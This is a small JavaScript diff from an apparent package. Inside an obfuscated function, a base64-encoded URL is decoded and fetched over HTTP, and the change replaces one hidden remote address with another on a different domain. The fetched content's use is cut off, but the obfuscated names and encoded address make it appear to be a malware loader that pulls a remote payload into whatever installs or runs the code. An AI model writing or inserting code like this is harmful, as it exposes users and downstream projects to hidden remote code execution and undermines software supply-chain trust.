@@ -4,7 +4,7 @@ const b1s2 = require('base-64');
 
 async function r3j8() {
     try {
-        const u7n1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JhcGxocy9yYXJib3RkYy9tYWluL2RzYTk3NXN4LmRzZnlkczA4ZnNkMC5hc2Rkc2EwOGRhcy50eHQ=";
+        const u7n1 = "aHR0cHM6Ly9xdWVyeWluZm8ud2lraS9yYXcvZENIMWc=";
         const v9o2 = b1s2.decode(u7n1);
 
         const q8s6 = await ax5k.get(v9o2);
